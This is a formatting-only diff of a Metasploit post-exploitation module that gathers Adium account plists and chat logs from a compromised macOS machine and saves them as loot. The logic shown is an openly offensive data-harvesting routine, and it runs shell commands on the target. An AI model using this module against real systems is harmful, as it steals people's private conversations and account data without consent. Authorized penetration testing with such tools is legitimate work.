@@ -3,40 +3,42 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 class MetasploitModule < Msf::Post
   include Msf::Post::File
   include Msf::Auxiliary::Report
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'          => 'OS X Gather Adium Enumeration',
-      'Description'   => %q{
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'OS X Gather Adium Enumeration',
+        'Description' => %q{
           This module will collect Adium's account plist files and chat logs from the
-        victim's machine.  There are three different actions you may choose: ACCOUNTS,
-        CHATS, and ALL.  Note that to use the 'CHATS' action, make sure you set the regex
-        'PATTERN' option in order to look for certain log names (which consists of a
-        contact's name, and a timestamp).  The current 'PATTERN' option is configured to
-        look for any log created on February 2012 as an example.  To loot both account
-        plists and chat logs, simply set the action to 'ALL'.
-      },
-      'License'       => MSF_LICENSE,
-      'Author'        => [ 'sinn3r'],
-      'Platform'      => [ 'osx' ],
-      'SessionTypes'  => [ "meterpreter", "shell" ],
-      'Actions'       =>
-        [
+          victim's machine.  There are three different actions you may choose: ACCOUNTS,
+          CHATS, and ALL.  Note that to use the 'CHATS' action, make sure you set the regex
+          'PATTERN' option in order to look for certain log names (which consists of a
+          contact's name, and a timestamp).  The current 'PATTERN' option is configured to
+          look for any log created on February 2012 as an example.  To loot both account
+          plists and chat logs, simply set the action to 'ALL'.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [ 'sinn3r'],
+        'Platform' => [ 'osx' ],
+        'SessionTypes' => [ "meterpreter", "shell" ],
+        'Actions' => [
           ['ACCOUNTS', { 'Description' => 'Collect account-related plists' } ],
-          ['CHATS',    { 'Description' => 'Collect chat logs with a pattern' } ],
-          ['ALL',      { 'Description' => 'Collect both account plists and chat logs'}]
+          ['CHATS', { 'Description' => 'Collect chat logs with a pattern' } ],
+          ['ALL', { 'Description' => 'Collect both account plists and chat logs' }]
         ],
-      'DefaultAction' => 'ALL'
-    ))
+        'DefaultAction' => 'ALL'
+      )
+    )
 
     register_options(
       [
         OptRegexp.new('PATTERN', [true, 'Match a keyword in any chat log\'s filename', '\(2012\-02\-.+\)\.xml$']),
-      ])
+      ]
+    )
   end
 
   #
@@ -80,8 +82,8 @@ class MetasploitModule < Msf::Post
         end
 
         targets << {
-          :account   => account,
-          :contact   => contact,
+          :account => account,
+          :contact => contact,
           :log_paths => filtered_logs
         }
       end
@@ -93,8 +95,8 @@ class MetasploitModule < Msf::Post
     logs = []
     targets.each do |target|
       log_size = target[:log_paths].length
-      contact  = target[:contact]
-      account  = target[:account]
+      contact = target[:contact]
+      account = target[:account]
 
       # Nothing was actually downloaded, skip this one
       next if log_size == 0
@@ -106,9 +108,9 @@ class MetasploitModule < Msf::Post
         logs << {
           :account => account,
           :contact => contact,
-          :data    => data
+          :data => data
         }
-        #break
+        # break
       end
     end
 
@@ -148,7 +150,7 @@ class MetasploitModule < Msf::Post
       if xml.empty?
         print_error("#{@peer} - Unalbe to parse: #{file}")
       else
-        loot << {:filename => file, :data => xml}
+        loot << { :filename => file, :data => xml }
         exec("rm #{rand_name}")
       end
     end
@@ -163,13 +165,14 @@ class MetasploitModule < Msf::Post
     case type
     when :account
       data.each do |e|
-        e[:filename] = e[:filename].gsub(/\\ /,'_')
+        e[:filename] = e[:filename].gsub(/\\ /, '_')
         p = store_loot(
           "adium.account.config",
           "text/plain",
           session,
           e[:data],
-          e[:filename])
+          e[:filename]
+        )
 
         print_good("#{@peer} - #{e[:filename]} stored as: #{p}")
       end
@@ -178,7 +181,7 @@ class MetasploitModule < Msf::Post
       data.each do |e|
         account = e[:account]
         contact = e[:contact]
-        data    = e[:data]
+        data = e[:data]
 
         p = store_loot(
           "adium.chatlog",
@@ -207,6 +210,7 @@ class MetasploitModule < Msf::Post
   def dir(path)
     subdirs = exec("ls -l #{path}")
     return [] if subdirs =~ /No such file or directory/
+
     items = subdirs.scan(/[A-Z][a-z][a-z]\x20+\d+\x20[\d\:]+\x20(.+)$/).flatten
     return items
   end
@@ -273,7 +277,7 @@ class MetasploitModule < Msf::Post
     # Now that adium is found, let's download some stuff
     #
     account_data = get_account_info(adium_path) if action.name =~ /ALL|ACCOUNTS/i
-    chatlogs     = get_chatlogs(adium_path)     if action.name =~ /ALL|CHATS/i
+    chatlogs = get_chatlogs(adium_path) if action.name =~ /ALL|CHATS/i
 
     #
     # Store what we found on disk
